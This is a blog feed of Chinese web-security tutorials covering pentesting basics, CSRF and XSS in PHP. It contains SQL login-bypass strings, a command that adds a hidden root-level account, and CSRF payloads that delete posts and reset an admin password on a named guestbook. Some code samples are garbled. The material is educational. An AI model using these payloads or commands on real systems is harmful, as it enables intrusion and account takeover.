      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web安全|渗透基础知识</title>
    <link href="http://yoursite.com/2018/03/26/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2018/03/26/Web安全-渗透基础知识/</id>
    <published>2018-03-26T10:39:00.000Z</published>
    <updated>2018-03-26T03:02:03.481Z</updated>
    
    <content type="html"><![CDATA[<p>自己在Web开发这条路上走了将近一年了，虽然能完成大部分的功能需求，但是代码质量堪忧，还是有一些安全漏洞，所以决定入坑Web安全，了解一波。</p>
<h3 id="HTML-表单基础"><a href="#HTML-表单基础" class="headerlink" title="HTML 表单基础"></a>HTML 表单基础</h3><ol>
<li>该表单是提交给哪个文件进行处理的（查看 action 属性值）</li>
<li>向后端程序提交的参数是什么（查看 name 属性）</li>
</ol>
<h3 id="SQL-数据库查询语句基础"><a href="#SQL-数据库查询语句基础" class="headerlink" title="SQL 数据库查询语句基础"></a>SQL 数据库查询语句基础</h3><ol>
<li>查询返回所有的结果</li>
</ol>
<p><code>select * from users;</code></p>
<ol>
<li>条件查询</li>
</ol>
<p><code>select * from users where uame=&#39;$uname&#39;</code>;</p>
<ol>
<li>union 合并多个查询结果</li>
</ol>
<p><code>select * from users union select * from msgs;</code></p>
<ol>
<li>… …</li>
</ol>
<h3 id="万能用户名或者万能密码"><a href="#万能用户名或者万能密码" class="headerlink" title="万能用户名或者万能密码"></a>万能用户名或者万能密码</h3><ul>
<li>第一种<br><code>select * from users where uame=&#39;&#39; or &#39;&#39;=&#39;&#39; and passwd=$passwd;</code></li>
<li>第二种<br><code>select _from users where uame=&#39;&#39; union select_ from users and passwd=$passwd;</code></li>
<li>第三种<br><code>select * from users where uame=$uname and passwd=&#39;&#39; or &#39;&#39;=&#39;&#39;;</code></li>
<li>… …</li>
</ul>
<h3 id="使用PDO进行防注入基础"><a href="#使用PDO进行防注入基础" class="headerlink" title="使用PDO进行防注入基础"></a>使用PDO进行防注入基础</h3><ol>
<li>允许长连接<br><code>PDO::ATTR_PERSISTENT=&gt;true</code></li>
<li>不允许使用预处理语句<br><code>PDO::ATTR_EMULATE_PREPARE=&gt;false</code></li>
<li>PDO 连接<br><code>$pdh=new PDO(host=&#39;127.0.0.1:1433&#39;,user=&#39;sa&#39;,password=&#39;root&#39;);</code></li>
<li>预处理 SQL 查询语句<br><code>$stmt=$dbh-&gt;prepare($sql)</code></li>
<li>填充 SQL 语句中的占位符<br><code>$stmt-&gt;execute(array(...,...,....));</code></li>
<li>SQL 占位符（如：select <em> from users where uname=? and passwd=?;）<br>`select </em> from users where uname=? and passwd=?;`</li>
<li>… …</li>
</ol>
<h3 id="Wireshark-抓包"><a href="#Wireshark-抓包" class="headerlink" title="Wireshark 抓包"></a>Wireshark 抓包</h3><ol>
<li>熟练使用 Wireshark 这款软件</li>
<li>熟练掌握过滤器的写法（如：tcp、udp、icmp、mac … …）</li>
<li>知道各个协议的包结构、包头、包尾</li>
<li>… …</li>
</ol>
<h3 id="审查代码的能力"><a href="#审查代码的能力" class="headerlink" title="审查代码的能力"></a>审查代码的能力</h3><ul>
<li>HTML 源文件内容（通过右键网页 –&gt; 查看源文件）</li>
<li>PHP 代码（了解代码逻辑以及书写规范，特别是对函数名的记忆）</li>
<li>PYTHON 代码（快速读懂代码意思，特别是要从 main 函数入手去查看）</li>
<li>C 语言代码（从代码中分析出来，该代码的意思以及各个函数的逻辑）</li>
<li>… …</li>
</ul>
<h3 id="各个-WEB-漏洞的利用能力"><a href="#各个-WEB-漏洞的利用能力" class="headerlink" title="各个 WEB 漏洞的利用能力"></a>各个 WEB 漏洞的利用能力</h3><ul>
<li>SQL 注入（通过万能用户名和万能密码来获取一定的 webshell）</li>
<li>命令注入（特别是PHP中的 exec 和 system 函数也能获取到一定的 webshell）</li>
<li>文件包含和目录遍历（通过 ../../../../… …/flag.txt 来获取文件）</li>
<li>… …</li>
</ul>
<h3 id="Liunx-服务的安全配置"><a href="#Liunx-服务的安全配置" class="headerlink" title="Liunx 服务的安全配置"></a>Liunx 服务的安全配置</h3><ul>
<li>SSH（禁止 root 登录；禁止空密码登录；禁止密钥登录 … …）</li>
<li>TELNET（禁止 root telnet；禁用 telnet … …）</li>
<li>VSFTP（不允许普通用户登录 ftp；禁止匿名用户登录 ftp … …）</li>
<li>HTTPD（禁止回显 banner 信息；严格控制目录权限 … …）</li>
<li>… …</li>
</ul>
<h3 id="PHP-安全配置"><a href="#PHP-安全配置" class="headerlink" title="PHP 安全配置"></a>PHP 安全配置</h3><ol>
<li>开启安全模式<br><code>safe_mode = on</code></li>
<li>禁用函数<br><code>disable_functions = system,exec,eval,shell_exec,phpinfo,... ...</code></li>
<li>禁止SQL注入<br><code>magic_quotes_gpc = On</code></li>
</ol>
<h3 id="PYTHON-渗透脚本基础"><a href="#PYTHON-渗透脚本基础" class="headerlink" title="PYTHON 渗透脚本基础"></a>PYTHON 渗透脚本基础</h3><ul>
<li>了解 scapy 这一模块（特别是在构造数据包的时候该怎么写）</li>
<li>了解 dpkt 封装或者拆解网络协议包</li>
<li>了解 socket 编程</li>
<li>能够从 help 这一帮助函数中获取到其他函数的使用方法</li>
<li>拥有快速阅读脚本的能力和代码逻辑思维</li>
<li>… …</li>
</ul>
<h3 id="Liunx-常用命令"><a href="#Liunx-常用命令" class="headerlink" title="Liunx 常用命令"></a>Liunx 常用命令</h3><ul>
<li>find<br><code>find  /  -iname  * | xargs  grep  –i  &#39;*key*&#39;</code></li>
<li>grep<br><code>grep  &#39;*key*&#39;  ./keystring.txt</code></li>
<li>netstat<br><code>netstat –tulnp 11.4 kill -9 [pid] 11.5 chattr +i /etc/passwd</code></li>
<li>kill<br><code>kill -9 [pid]</code></li>
<li>chattr<br><code>chattr  +i  /etc/passwd /etc/shadow</code></li>
<li>useradd<br><code>useradd  -o  -u  0  test</code></li>
</ul>
<h3 id="WEB-漏洞训练平台"><a href="#WEB-漏洞训练平台" class="headerlink" title="WEB 漏洞训练平台"></a>WEB 漏洞训练平台</h3><ul>
<li>DVWA <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="external">【DVWA】</a></li>
<li>Web For Pentester <a href="https://pentesterlab.com/exercises/web_for_pentester_II" target="_blank" rel="external">【Web For Pentester II】</a>(请自行安装镜像，安装时请选择”其他 Liunx 3.x 内核 64 位”)</li>
<li>ZVulDrill <a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="external">【ZVulDrill】</a>(请自行准备 PHP 环境)</li>
<li>… …</li>
</ul>
<h3 id="网络协议原理"><a href="#网络协议原理" class="headerlink" title="网络协议原理"></a>网络协议原理</h3><ul>
<li>Tcp 三次握手和四次挥手</li>
<li>Icmp 发包以及回包</li>
<li>Mac 防洪原理</li>
<li>ARP 发广播包，ARP 欺骗</li>
<li>Dtp 生成树攻击原理</li>
<li>… …</li>
</ul>
<h3 id="关于-PYTHON-的网络渗透编程"><a href="#关于-PYTHON-的网络渗透编程" class="headerlink" title="关于 PYTHON 的网络渗透编程"></a>关于 PYTHON 的网络渗透编程</h3><ul>
<li><p>ARP 扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import socket</div><div class="line"># or</div><div class="line">from scapy.all import *</div></pre></td></tr></table></figure>
</li>
<li><p>ARP 欺骗、ARP 监控<br><code>from scapy.all import *</code></p>
</li>
<li>OS 扫描<br><code>import nmap</code></li>
<li><p>Mac 防洪</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import socket</div><div class="line"># or</div><div class="line">from scapy.all import *</div></pre></td></tr></table></figure>
</li>
<li><p>mssql 数据库密码爆破<br><code>import pymssql</code></p>
</li>
<li>跨越 VlAN 攻击<br><code>from scapy.all import *</code></li>
<li>Dtp 攻击<br><code>from scapy.all import *</code></li>
<li>… …<br><a href="https://vxhly.github.io/2017/09/pentest-basic-knowledge/" target="_blank" rel="external">渗透基础知识</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自己在Web开发这条路上走了将近一年了，虽然能完成大部分的功能需求，但是代码质量堪忧，还是有一些安全漏洞，所以决定入坑Web安全，了解一波。&lt;/p&gt;
&lt;h3 id=&quot;HTML-表单基础&quot;&gt;&lt;a href=&quot;#HTML-表单基础&quot; class=&quot;headerlink&quot; tit
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web安全|一些有用的工具</title>
    <link href="http://yoursite.com/2018/03/26/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2018/03/26/Web安全-一些有用的工具/</id>
    <published>2018-03-25T23:44:58.000Z</published>
    <updated>2018-03-26T03:20:21.818Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安利一些工具"><a href="#安利一些工具" class="headerlink" title="安利一些工具"></a>安利一些工具</h3><p>Sqlmap </p>
<p><a href="https://vxhly.github.io/2016/09/usage-of-sqlmap/" target="_blank" rel="external">SQLmap 的用法</a></p>
<p>DVWA<br><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="external">下载安装</a><br><a href="http://www.cnblogs.com/lsdb/p/6826519.html" target="_blank" rel="external">使用教程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;安利一些工具&quot;&gt;&lt;a href=&quot;#安利一些工具&quot; class=&quot;headerlink&quot; title=&quot;安利一些工具&quot;&gt;&lt;/a&gt;安利一些工具&lt;/h3&gt;&lt;p&gt;Sqlmap &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://vxhly.github.io/2016/0
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-跨网站请求伪造</title>
    <link href="http://yoursite.com/2018/03/25/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E8%B7%A8%E7%BD%91%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>http://yoursite.com/2018/03/25/PHP-PHP漏洞全解-跨网站请求伪造/</id>
    <published>2018-03-24T18:30:47.000Z</published>
    <updated>2018-03-24T10:43:45.352Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>CSRF(Cross Site Request Forgeries)，意为跨网站请求伪造，也有写为XSRF。攻击者伪造目标用户的HTTP请求，然后此请求发送到有CSRF漏洞的网站，网站执行此请求后，引发跨站请求伪造攻击。攻击者利用隐蔽的HTTP连接，让目标用户在不注意的情况下单击这个链接，由于是用户自己点击的，而他又是合法用户拥有合法权限，所以目标用户能够在网站内执行特定的HTTP链接，从而达到攻击者的目的。</p>
<h3 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><p>随缘网络PHP留言板V1.0</p>
<h4 id="任意删除留言"><a href="#任意删除留言" class="headerlink" title="任意删除留言"></a>任意删除留言</h4><pre><code>include_once(&quot;dlyz.php&quot;); //dlyz.php用户验证权限，当权限是admin的时候方可删除留言 
include_once(&quot;../conn.php&quot;); 
$del=$_GET[&quot;del&quot;]; 
$id=$_GET[&quot;id&quot;]; 
if ($del==&quot;data&quot;) { 
    $ID_Dele= implode(&quot;,&quot;,$_POST[&apos;adid&apos;]); 
    $sql=&quot;delete from book where id in (&quot;.$ID_Dele.&quot;)&quot;; 
    mysql_query($sql); 
} 
else { 
    $sql=&quot;delete from book where id=&quot;.$id; //传递要删除的留言ID 
    mysql_query($sql); 
} 
mysql_close($conn); 
echo &quot;&quot;; 
echo &quot;alert(‘删除成功！’);&quot;; 
echo &quot; location=’book.php’;&quot;; 
echo &quot;&quot;; 
?&gt; 
</code></pre><p>当我们具有admin权限，提交<a href="http://localhost/manage/delbook.php?id=2" target="_blank" rel="external">http://localhost/manage/delbook.php?id=2</a> 时，就会删除id为2的留言。</p>
<p>利用方法:</p>
<p>我们使用普通用户留言（源代码方式），内容为。</p>
<pre><code>&quot;delbook.php?id=2&quot; /&gt; 
&quot;delbook.php?id=3&quot; /&gt; 
&quot;delbook.php?id=4&quot; /&gt; 
&quot;delbook.php?id=5&quot; /&gt; 
</code></pre><p>插入4张图片链接分别删除4个id留言，然后我们返回首页浏览看，没有什么变化。。(图片显示不了)</p>
<p>现在我们再用管理员账号登陆后，来刷新首页，会发现留言就剩一条，其他在图片链接中指定的ID号的留言，全部都被删除。</p>
<p>攻击者在留言中插入隐藏的图片链接，此链接具有删除留言的作用，而攻击者自己访问这些图片链接的时候，是不具有权限的，所以看不到任何效果，但是当管理员登陆后，查看此留言，就会执行隐藏的链接，而他的权限又是足够大的，从而这些留言就被删除了.</p>
<h4 id="修改管理员密码"><a href="#修改管理员密码" class="headerlink" title="修改管理员密码"></a>修改管理员密码</h4><pre><code>//pass.php 
if($_GET[&quot;act&quot;]) { 
    $username=$_POST[&quot;username&quot;]; 
    $sh=$_POST[&quot;sh&quot;]; 
    $gg=$_POST[&quot;gg&quot;]; 
    $title=$_POST[&quot;title&quot;]; 
    $copyright=$_POST[&quot;copyright&quot;];
    $password=md5($_POST[&quot;password&quot;]); 
if(emptyempty($_POST[&quot;password&quot;])) { 
    $sql=&quot;update gly set username=’&quot;.$username.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; 
} 
else { 
    $sql=&quot;update gly set username=’&quot;.$username.&quot;’,password=’&quot;.$password.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; 
} 
mysql_query($sql); 
mysql_close($conn); 
echo &quot;&quot;; 
echo &quot;alert(‘修改成功！’);&quot;; 
echo &quot; location=’pass.php’;&quot;; 
echo &quot;&quot;; 
} 
</code></pre><p>这个文件用于修改管理密码和网站设置的一些信息，我们可以直接构造如下表单:</p>
<pre><code>&lt;body&gt; 
    &lt;form action=&quot;http://localhost/manage/pass.php?act=xg&quot; method=&quot;post&quot; name=&quot;form1&quot; id=&quot;form1&quot;&gt; 
    &lt;input type=&quot;radio&quot; value=&quot;1&quot; name=&quot;sh&quot;&gt; 
    &lt;input type=&quot;radio&quot; name=&quot;sh&quot; checked value=&quot;0&quot;&gt; 
    &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;root&quot;&gt; 
    &lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;root&quot;&gt; 
    &lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;随缘网络PHP留言板V1.0(带审核功能)&quot; &gt; 
    &lt;textarea name=&quot;gg&quot; rows=&quot;6&quot; cols=&quot;80&quot; &gt;欢迎您安装使用随缘网络PHP留言板V1.0(带审核功能)！textarea&gt; 
    &lt;textarea name=&quot;copyright&quot; rows=&quot;6&quot; cols=&quot;80&quot; &gt;随缘网络PHP留言本V1.0 版权所有：厦门随缘网络科技 2005-2009&lt;br/&gt;承接网站建设及系统定制 提供优惠主机域名textarea&gt; 
    form&gt; 
&lt;body&gt; 
</code></pre><p>存为attack.html，放到自己网站上<a href="http://www.wduozhi.xyz/attack.html，此页面访问后会自动向目标程序的pass.php提交参数，用户名修改为root，密码修改为root，然后我们去留言板发一条留言，隐藏这个链接，管理访问以后，他的用户名和密码全部修改成了root" target="_blank" rel="external">http://www.wduozhi.xyz/attack.html，此页面访问后会自动向目标程序的pass.php提交参数，用户名修改为root，密码修改为root，然后我们去留言板发一条留言，隐藏这个链接，管理访问以后，他的用户名和密码全部修改成了root</a></p>
<h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><p>防范CSRF要比防范其他攻击更加困难，因为CSRF的HTTP请求虽然是攻击者伪造的，但是却是由目标用户发出的，一般常见的防范方法有下面几种:</p>
<ol>
<li>检查网页的来源</li>
<li>检查内置的隐藏变量</li>
<li>使用POST，不要使用GET</li>
</ol>
<h4 id="检查网页来源"><a href="#检查网页来源" class="headerlink" title="检查网页来源"></a>检查网页来源</h4><p>在//pass.php头部加入以下红色字体代码，验证数据提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">if($_GET[&quot;act&quot;]) </div><div class="line">&#123; </div><div class="line">    if(isset($_SERVER[&quot;HTTP_REFERER&quot;])) </div><div class="line">    &#123; </div><div class="line">        $serverhost = $_SERVER[&quot;SERVER_NAME&quot;]; </div><div class="line">        $strurl = str_replace(&quot;http://&quot;,&quot;&quot;,$_SERVER[&quot;HTTP_REFERER&quot;]); </div><div class="line">        $strdomain = explode(&quot;/&quot;,$strurl); </div><div class="line">        $sourcehost = $strdomain[0]; </div><div class="line">    if(strncmp($sourcehost, $serverhost, strlen($serverhost))) </div><div class="line">    &#123;</div><div class="line">        unset($_POST); </div><div class="line">        echo &quot;&quot;; </div><div class="line">        echo &quot;alert(‘数据来源异常!’);&quot;; </div><div class="line">        echo &quot; location=’index.php’;&quot;;</div><div class="line">        echo &quot;&quot;; </div><div class="line">     &#125; </div><div class="line">     &#125; </div><div class="line">    $username=$_POST[&quot;username&quot;]; </div><div class="line">    $sh=$_POST[&quot;sh&quot;]; </div><div class="line">    $gg=$_POST[&quot;gg&quot;]; </div><div class="line">    $title=$_POST[&quot;title&quot;]; </div><div class="line">    $copyright=$_POST[&quot;copyright&quot;].&quot;</div><div class="line">设计制作：厦门随缘网络科技&quot;; </div><div class="line">    $password=md5($_POST[&quot;password&quot;]); </div><div class="line">    if(emptyempty($_POST[&quot;password&quot;])) </div><div class="line">    &#123; </div><div class="line">        $sql=&quot;update gly set username=’&quot;.$username.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; </div><div class="line">    &#125; </div><div class="line">    else </div><div class="line">    &#123; </div><div class="line">        $sql=&quot;update gly set username=’&quot;.$username.&quot;’,password=’&quot;.$password.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; </div><div class="line">    &#125; </div><div class="line">mysql_query($sql); </div><div class="line">mysql_close($conn); </div><div class="line">echo &quot;&quot;; </div><div class="line">echo &quot;alert(‘修改成功！’);&quot;; </div><div class="line">echo &quot; location=’pass.php’;&quot;; </div><div class="line">echo &quot;&quot;; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="检查内置隐藏变量"><a href="#检查内置隐藏变量" class="headerlink" title="检查内置隐藏变量"></a>检查内置隐藏变量</h4><p>我们在表单中内置一个隐藏变量和一个session变量，然后检查这个隐藏变量和session变量是否相等，以此来判断是否同一个网页所调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">include_once(&quot;dlyz.php&quot;); </div><div class="line">include_once(&quot;../conn.php&quot;); </div><div class="line">if($_GET[&quot;act&quot;]) </div><div class="line">&#123; </div><div class="line">    if (!isset($_SESSION[&quot;post_id&quot;])) </div><div class="line">    &#123; </div><div class="line">        // 生成唯一的ID，并使用MD5来加密 </div><div class="line">        $post_id = md5(uniqid(rand(), true)); </div><div class="line">        // 创建Session变量 </div><div class="line">        $_SESSION[&quot;post_id&quot;] = $post_id; </div><div class="line">    &#125; </div><div class="line">// 检查是否相等 </div><div class="line">if (isset($_SESSION[&quot;post_id&quot;])) </div><div class="line">&#123; </div><div class="line">    // 不相等 </div><div class="line">    if ($_SESSION[&quot;post_id&quot;] != $_POST[&quot;post_id&quot;]) </div><div class="line">    &#123; </div><div class="line">        // 清除POST变量 </div><div class="line">        unset($_POST); </div><div class="line">        echo &quot;&lt;script language=’javascript’&gt;&quot;; </div><div class="line">        echo &quot;alert(‘数据来源异常!’);&quot;; </div><div class="line">        echo &quot; location=’index.php’;&quot;; </div><div class="line">        echo &quot;script&gt;&quot;; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line">…… </div><div class="line">&lt;input type=&quot;reset&quot; name=&quot;Submit2&quot; value=&quot;重 置&quot;&gt; </div><div class="line">&lt;input type=&quot;hidden&quot; name=&quot;post_id&quot; value=&quot;php echo $_SESSION[&quot;post_id&quot;];?&gt;&quot;&gt; </div><div class="line"></div><div class="line">mysql_close($conn); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="使用POST，不要使用GET"><a href="#使用POST，不要使用GET" class="headerlink" title="使用POST，不要使用GET"></a>使用POST，不要使用GET</h4><p>传递表单字段时，一定要是用POST，不要使用GET，处理变量也不要直接使用$_REQUEST</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;CSRF(Cross Site Request Forgeries)，意为跨网站请求伪造，也有写为XSRF。攻击者伪造目标用户的HTTP请求
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-跨站脚本攻击XSS</title>
    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/"/>
    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-跨站脚本攻击XSS/</id>
    <published>2018-03-24T00:29:09.000Z</published>
    <updated>2018-03-24T10:19:42.120Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>跨站脚本攻击(Cross Site Script为了区别于CSS简称为XSS)指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p>
<h3 id="一个简单的留言板"><a href="#一个简单的留言板" class="headerlink" title="一个简单的留言板"></a>一个简单的留言板</h3><p>我们有个页面用于允许用户发表留言，然后在页面底部显示留言列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;?php include(&apos;/components/headerinclude.php&apos;);?&gt;&lt;/head&gt;</div><div class="line">    &lt;style type=&quot;text/css&quot;&gt;</div><div class="line">        .comment-title&#123;</div><div class="line">            font-size:14px;</div><div class="line">            margin: 6px 0px 2px 4px;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        .comment-body&#123;</div><div class="line">            font-size: 14px;</div><div class="line">            color:#ccc;</div><div class="line">            font-style: italic;</div><div class="line">            border-bottom: dashed 1px #ccc;</div><div class="line">            margin: 4px;</div><div class="line">        &#125;</div><div class="line">    &lt;/style&gt;</div><div class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;/js/cookies.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;form method=&quot;post&quot; action=&quot;list.php&quot;&gt;</div><div class="line">        &lt;div style=&quot;margin:20px;&quot;&gt;</div><div class="line">            &lt;div style=&quot;font-size:16px;font-weight:bold;&quot;&gt;Your Comment&lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding:6px;&quot;&gt;</div><div class="line">                Nick Name:</div><div class="line">                &lt;br/&gt;</div><div class="line">                &lt;input name=&quot;name&quot; type=&quot;text&quot; style=&quot;width:300px;&quot;/&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding:6px;&quot;&gt;</div><div class="line">                Comment:</div><div class="line">                &lt;br/&gt;</div><div class="line">                &lt;textarea name=&quot;comment&quot; style=&quot;height:100px; width:300px;&quot;&gt;&lt;/textarea&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding-left:230px;&quot;&gt;</div><div class="line">                &lt;input type=&quot;submit&quot; value=&quot;POST&quot; style=&quot;padding:4px 0px; width:80px;&quot;/&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;border-bottom:solid 1px #fff;margin-top:10px;&quot;&gt;</div><div class="line">                &lt;div style=&quot;font-size:16px;font-weight:bold;&quot;&gt;Comments&lt;/div&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;?php </div><div class="line">                require(&apos;/components/comments.php&apos;); </div><div class="line">                if(!empty($_POST[&apos;name&apos;]))&#123;</div><div class="line">                    addElement($_POST[&apos;name&apos;],$_POST[&apos;comment&apos;]);</div><div class="line">                &#125;</div><div class="line">                renderComments();</div><div class="line">            ?&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>addElement()方法用于添加新的留言，而renderComments()方法用于展留言列表，网页看起来是这样的</p>
<p><img src="/images/PHP漏洞分析-跨站脚本XSS-01.png" alt="Wb" title="PHP漏洞分析-跨站脚本XSS-01"></p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>因为我们完全信任了用户输入，但有些别有用心的用户会像这样的输入</p>
<p><img src="/images/PHP漏洞分析-跨站脚本XSS-02.png" alt="用户输入" title="PHP漏洞分析-跨站脚本XSS-02"></p>
<p>这样无论是谁访问这个页面的时候控制台都会输出“Hey you are a fool fish!”，如果这只是个恶意的小玩笑，有些人做的事情就不可爱了，有些用户会利用这个漏洞窃取用户信息、诱骗人打开恶意网站或者下载恶意程序等，看个最简单的例子</p>
<h3 id="利用xss窃取用户名密码"><a href="#利用xss窃取用户名密码" class="headerlink" title="利用xss窃取用户名密码"></a>利用xss窃取用户名密码</h3><p>当然这个示例很简单，几乎攻击不到任何网站，仅仅看看其原理。我们知道很多登陆界面都有记住用户名、密码的功能方便用户下次登录，有些网站是直接用明文记录用户名、密码，恶意用户注册账户登录后使用简单工具查看cookie结构名称后，如果网站有xss漏洞，那么简单的利用jsonp就可以获取其它用户的用户名、密码了。</p>
